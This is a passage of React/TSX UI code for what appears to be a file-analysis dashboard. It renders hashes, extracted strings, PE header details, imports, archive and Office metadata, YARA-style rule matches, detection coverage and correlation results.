              <IOCTable iocs={analysis.iocs} source="/file" />
            )}

            {activeTab === "mitre" && (
              <MitrePanel techniques={analysis.mitre} />
            )}

            <Panel title="Raw Hash Inventory" priority="secondary">
              {binaryNotice && (
                <p className="mb-2 rounded border border-warning/40 bg-warning/10 px-2 py-1 text-mono ba-text-2xs text-warning">
                  Hashes are of the text projection, not the original binary bytes.
                </p>
              )}
              <div className="flex flex-wrap items-center gap-2">
                {[
                  { label: "MD5", value: analysis.hashes.md5 },
                  { label: "SHA1", value: analysis.hashes.sha1 },
                  { label: "SHA256", value: analysis.hashes.sha256 },
                ].map(h => (
                  <button key={h.label} onClick={() => copyText(h.value).then(() => toast.success(`${h.label} copied`)).catch(() => {})}
                    className="group inline-flex items-center gap-1.5 rounded border border-subtle bg-surface-1 px-2 py-1 text-mono ba-text-2xs text-muted-foreground hover:text-foreground">
                    <Hash className="h-3 w-3" />
                    <span className="font-semibold">{h.label}</span>
                    <span className="font-mono">{h.value.slice(0, 16)}...</span>
                  </button>
                ))}
              </div>
            </Panel>

            <Panel title="Hash Relationships" priority="secondary">
              <div className="space-y-3">
                <div>
                  <div className="mb-1 text-mono ba-text-2xs text-muted-foreground">Own hashes (computed)</div>
                  <div className="space-y-1">
                    {analysis.hashRelations.own.map(h => (
                      <div key={h.alg} className="flex items-center gap-2">
                        <span className="shrink-0 text-mono ba-text-xs text-muted-foreground">{h.alg}</span>
                        <code className="truncate text-mono ba-text-sm text-fg-dim font-mono">{h.value}</code>
                        <button onClick={() => copyText(h.value).then(() => toast.success(`${h.alg} copied`)).catch(() => {})}
                          className="shrink-0 rounded border border-subtle bg-surface-1 px-1 py-0.5 text-mono ba-text-3xs text-muted-foreground hover:text-foreground">copy</button>
                      </div>
                    ))}
                  </div>
                </div>
                {analysis.hashRelations.embedded.length > 0 && (
                  <div>
                    <div className="mb-1 text-mono ba-text-2xs text-muted-foreground">Embedded hashes in content ({analysis.hashRelations.embedded.length})</div>
                    <div className="flex flex-wrap gap-1.5">
                      {analysis.hashRelations.embedded.slice(0, 24).map(h => (
                        <button key={`${h.alg}-${h.value}`} onClick={() => copyText(h.value).then(() => toast.success(`${h.alg} copied`)).catch(() => {})}
                          className="inline-flex items-center gap-1.5 rounded border border-subtle bg-surface-1 px-2 py-1 text-mono ba-text-3xs text-muted-foreground hover:text-foreground">
                          <Hash className="h-3 w-3" />
                          <span>{h.alg}</span>
                          <span className="font-mono">{h.value.slice(0, 12)}…</span>
                        </button>
                      ))}
                    </div>
                  </div>
                )}
                <p className="text-mono ba-text-2xs text-muted-foreground">{analysis.hashRelations.note}</p>
              </div>
            </Panel>

            {analysis.strings.total > 0 && (
              <Panel title={`Strings · ${analysis.strings.total}`} priority="secondary">
                <div className="mb-2 flex flex-wrap gap-1.5">
                  {Object.entries(analysis.strings.categories).map(([k, n]) => (
                    <span key={k} className="rounded border border-subtle bg-surface-1 px-1.5 py-0.5 text-mono ba-text-3xs text-muted-foreground">{k} · {n}</span>
                  ))}
                </div>
                <div className="max-h-56 space-y-1 overflow-y-auto">
                  {analysis.strings.samples.map((s, i) => (
                    <div key={i} className="flex items-center gap-2 text-mono ba-text-3xs">
                      <Chip tone={s.kind === "url" || s.kind === "ipv4" || s.kind === "email" ? "warning" : s.kind === "api" ? "info" : "default"}>{s.kind}</Chip>
                      <span className="truncate text-fg-dim">{s.value}</span>
                      <span className="ml-auto shrink-0 text-muted-foreground">{s.length}</span>
                    </div>
                  ))}
                </div>
              </Panel>
            )}

            <Panel title="PE Header" priority="secondary">
              {analysis.pe.detected ? (
                <div className="space-y-1">
                  <div className="flex items-center gap-2 text-mono ba-text-sm text-foreground">
                    <Chip tone="warning">detected</Chip>{analysis.pe.signature}
                  </div>
                  {[
                    { label: "Machine", value: analysis.pe.machine ?? "unknown (non-ASCII byte)" },
                    { label: "Subsystem", value: analysis.pe.subsystem ?? "unknown (non-ASCII byte)" },
                    { label: "Entry point", value: analysis.pe.entryPoint ? `0x${analysis.pe.entryPoint}` : "unknown (non-ASCII byte)" },
                  ].map(r => (
                    <div key={r.label} className="flex gap-2 text-mono ba-text-xs">
                      <span className="text-muted-foreground">{r.label}</span><span className="text-fg-dim">{r.value}</span>
                    </div>
                  ))}
                  <p className="pt-1 text-mono ba-text-2xs text-muted-foreground">{analysis.pe.note}</p>
                </div>
              ) : (
                <p className="text-mono ba-text-sm text-fg-dim">{analysis.pe.note}</p>
              )}
            </Panel>

            <Panel title="Imports & API Calls" priority="secondary">
              <div className="space-y-3">
                {analysis.imports.dlls.length > 0 && (
                  <div>
                    <div className="mb-1 text-mono ba-text-2xs text-muted-foreground">Referenced binaries ({analysis.imports.dlls.length})</div>
                    <div className="flex flex-wrap gap-1.5">
                      {analysis.imports.dlls.map(d => (
                        <span key={d} className="rounded border border-subtle bg-surface-1 px-1.5 py-0.5 text-mono ba-text-3xs text-fg-dim">{d}</span>
                      ))}
                    </div>
                  </div>
                )}
                {analysis.imports.apis.length > 0 && (
                  <div>
                    <div className="mb-1 text-mono ba-text-2xs text-muted-foreground">Detected API calls</div>
                    <div className="flex flex-wrap gap-1.5">
                      {analysis.imports.apis.map(a => (
                        <span key={a.name} className={"rounded border px-1.5 py-0.5 text-mono ba-text-3xs " + (a.suspicious ? "border-destructive/40 bg-destructive/10 text-destructive" : "border-subtle bg-surface-1 text-fg-dim")}>{a.name}</span>
                      ))}
                    </div>
                  </div>
                )}
                {analysis.imports.dlls.length === 0 && analysis.imports.apis.length === 0 && (
                  <p className="text-mono ba-text-sm text-fg-dim">No DLL references or API-like strings found.</p>
                )}
                <p className="text-mono ba-text-2xs text-muted-foreground">{analysis.imports.note}</p>
              </div>
            </Panel>

            <Panel title="Archive / Container" priority="secondary">
              <div className="space-y-1.5">
                <div className="flex items-center gap-2 text-mono ba-text-sm text-foreground">
                  <span className="text-muted-foreground">Kind</span>
                  <Chip tone={analysis.archive.kind ? "warning" : "default"}>{analysis.archive.kind ?? "none detected"}</Chip>
                </div>
                {analysis.archive.entries.length > 0 && (
                  <div className="space-y-1">
                    <div className="text-mono ba-text-xs text-muted-foreground">Entries</div>
                    <div className="flex flex-wrap gap-1.5">
                      {analysis.archive.entries.map(e => (
                        <span key={e} className="rounded border border-subtle bg-surface-1 px-1.5 py-0.5 text-mono ba-text-3xs text-fg-dim">{e}</span>
                      ))}
                    </div>
                  </div>
                )}
                <p className="text-mono ba-text-2xs text-muted-foreground">{analysis.archive.note}</p>
              </div>
            </Panel>

            {analysis.office.detected && (
              <Panel title="Office Metadata" priority="secondary">
                <div className="space-y-1">
                  {analysis.office.fields.length === 0 && <p className="text-mono ba-text-sm text-fg-dim">No core.xml properties extracted.</p>}
                  {analysis.office.fields.map(r => (
                    <div key={r.label} className="flex gap-2 text-mono ba-text-xs">
                      <span className="text-muted-foreground">{r.label}</span><span className="max-w-[32rem] truncate text-fg-dim">{r.value}</span>
                    </div>
                  ))}
                  {analysis.office.macros && (
                    <div className="flex items-center gap-2 pt-1">
                      <Chip tone="destructive">macros</Chip>
                      <span className="text-mono ba-text-xs text-destructive">VBA project present</span>
                    </div>
                  )}
                  <p className="pt-1 text-mono ba-text-2xs text-muted-foreground">{analysis.office.note}</p>
                </div>
              </Panel>
            )}

            <Panel title="YARA-style Preview" priority="secondary">
              <div className="space-y-1.5">
                {analysis.yara.filter(r => r.matched).length === 0 && (
                  <p className="text-mono ba-text-sm text-fg-dim">No built-in rules matched.</p>
                )}
                {analysis.yara.filter(r => r.matched).map(r => (
                  <div key={r.name} className={"rounded border border-l-2 px-3 py-2 " + (r.tags.includes("ransomware") || r.tags.includes("injection") ? "border-l-destructive/50 border-border bg-surface-0" : "border-l-warning/50 border-border bg-surface-0")}>
                    <div className="flex items-center gap-2">
                      <Chip tone={r.tags.includes("ransomware") || r.tags.includes("injection") ? "destructive" : "warning"}>{r.name}</Chip>
                      <span className="flex-1 truncate text-mono ba-text-2xs text-muted-foreground">{r.description}</span>
                      {r.tags.map(t => <span key={t} className="rounded bg-surface-1 px-1 py-0.5 text-mono ba-text-3xs text-muted-foreground">{t}</span>)}
                    </div>
                    {r.evidence.length > 0 && (
                      <div className="mt-1 space-y-0.5">
                        {r.evidence.map((e, i) => (
                          <div key={i} className="truncate text-mono ba-text-3xs text-fg-dim">▸ {e}</div>
                        ))}
                      </div>
                    )}
                  </div>
                ))}
                <p className="text-mono ba-text-2xs text-muted-foreground">Illustrative offline rule preview — not YARA. Port matches to a real YARA rule before operational use.</p>
              </div>
            </Panel>

            <EntitySection title="Recommendations" icon={Sparkles} meta={`${analysis.recommendations.length} open · engine`}>
              {analysis.recommendations.length === 0 ? (
                <p className="text-mono ba-text-sm text-muted-foreground">No open recommendations.</p>
              ) : (
                <div className="space-y-2">
                  {analysis.recommendations.map((rec) => (
                    <div key={rec.id} className="flex items-start gap-2.5 rounded-md border border-subtle bg-surface-1 px-3 py-2.5">
                      <Chip tone={rec.priority === "high" ? "destructive" : rec.priority === "medium" ? "warning" : "info"}>{rec.kind}</Chip>
                      <div className="min-w-0 flex-1">
                        <div className="text-mono ba-text-sm text-foreground">{rec.statement}</div>
                        <p className="mt-0.5 ba-text-2xs text-muted-foreground">{rec.reason} · {rec.evidenceRefs.length} evidence ref{rec.evidenceRefs.length === 1 ? "" : "s"}</p>
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </EntitySection>

            {analysis.opportunities.length > 0 && (
              <EntitySection title="Detection Coverage" icon={Crosshair} meta={`${analysis.opportunities.length} technique${analysis.opportunities.length === 1 ? "" : "s"} · engine`}>
                <div className="space-y-2">
                  {analysis.opportunities.map((o) => (
                    <div key={o.id} className="rounded-md border border-subtle bg-surface-1 px-3 py-2.5">
                      <div className="flex flex-wrap items-center gap-2">
                        <span className="text-mono ba-text-2xs font-semibold text-destructive">{o.technique}</span>
                        <Chip tone={o.coverage === "detected" ? "success" : o.coverage === "gap" ? "warning" : "info"}>{o.coverage}</Chip>
                        <Chip tone="primary">{o.priority}</Chip>
                      </div>
                      <p className="mt-1 ba-text-2xs leading-relaxed text-muted-foreground">{o.behavior}</p>
                      {o.existingRule && <p className="mt-1 text-mono ba-text-3xs text-fg-dim">existing rule · {o.existingRule}</p>}
                      {o.suggestedHunt && <p className="mt-1 text-mono ba-text-3xs text-fg-dim">hunt · {o.suggestedHunt}</p>}
                      {o.suggestedRule && (
                        <pre className="mt-2 overflow-x-auto rounded border border-subtle bg-surface-0 p-2 text-mono ba-text-3xs text-fg-dim">{o.suggestedRule.draft}</pre>
                      )}
                    </div>
                  ))}
                </div>
              </EntitySection>
            )}

            <EntitySection title="Analysis Quality" icon={Activity} meta={`coverage ${Math.round((analysis.quality.coverage.score ?? 0) * 100)}%`}>
              <div className="grid gap-2 grid-cols-2">
                <div className="rounded-md border border-subtle bg-surface-1 px-3 py-2.5">
                  <div className="text-mono ba-text-2xs text-muted-foreground">coverage score</div>
                  <div className="mt-1 text-mono ba-text-xl font-semibold text-foreground">{Math.round((analysis.quality.coverage.score ?? 0) * 100)}%</div>
                  <div className="mt-1.5 flex flex-wrap gap-1">
                    {analysis.quality.coverage.gaps.length === 0 ? (
                      <Chip tone="success">all evidence categories covered</Chip>
                    ) : (
                      analysis.quality.coverage.gaps.map((g) => <Chip key={g} tone="info">{g}</Chip>)
                    )}
                  </div>
                </div>
                <div className="rounded-md border border-subtle bg-surface-1 px-3 py-2.5">
                  <div className="text-mono ba-text-2xs text-muted-foreground">recommended next step</div>
                  <p className="mt-1 ba-text-sm text-foreground">{analysis.quality.recommendedNextStep}</p>
                  {analysis.quality.weakSignals.length > 0 && (
                    <p className="mt-1.5 text-mono ba-text-3xs text-fg-dim">weak signals · {analysis.quality.weakSignals.join(", ")}</p>
                  )}
                </div>
              </div>
            </EntitySection>

            <EntitySection title="Correlation" icon={Workflow} meta={`${analysis.correlation.length} matches · local history`}>
              {analysis.correlation.length === 0 ? (
                <p className="text-mono ba-text-sm text-muted-foreground">
                  No prior-case, detection, or intel-corpus matches in the local case/detection/entity corpus. Findings above are unaffected.
                </p>
              ) : (
                <div className="space-y-2">
                  {analysis.correlation.map((m) => (
                    <div key={`${m.dimension}-${m.value}`} className="rounded-md border border-subtle bg-surface-1 px-3 py-2.5">
                      <div className="flex flex-wrap items-center gap-2">
                        <Chip tone="info">{m.dimension}</Chip>
                        <span className="text-mono ba-text-sm text-foreground">{m.value}</span>
                        <Chip tone="primary">{Math.round(m.confidence * 100)}%</Chip>
                      </div>
                      <p className="mt-1 text-mono ba-text-3xs text-fg-dim">{m.label} · {m.matches.map((x) => x.label).join(", ")}</p>
                    </div>
                  ))}
                </div>
              )}
              {analysis.correlationRelationships.length > 0 && (
                <p className="mt-2 text-mono ba-text-3xs text-muted-foreground">{analysis.correlationRelationships.length} graph relationship(s) queued with origin=correlation for analyst review.</p>
              )}
            </EntitySection>

            {/* Forensic Modals */}
            <YaraRuleModal
              isOpen={yaraModalOpen}
              onClose={() => setYaraModalOpen(false)}
              ruleContent={analysis.synthesizedYara || ""}
              fileName={analysis.fileName}
              sampleText={analysis.raw}
            />

            <HexViewerModal
              isOpen={hexModalOpen}
              onClose={() => setHexModalOpen(false)}
              rawContent={analysis.raw}
              fileName={analysis.fileName}
            />
          </>
        )}
      </AnalyzerShell>
    </PageShell>
    </ErrorBoundary>
  );
}
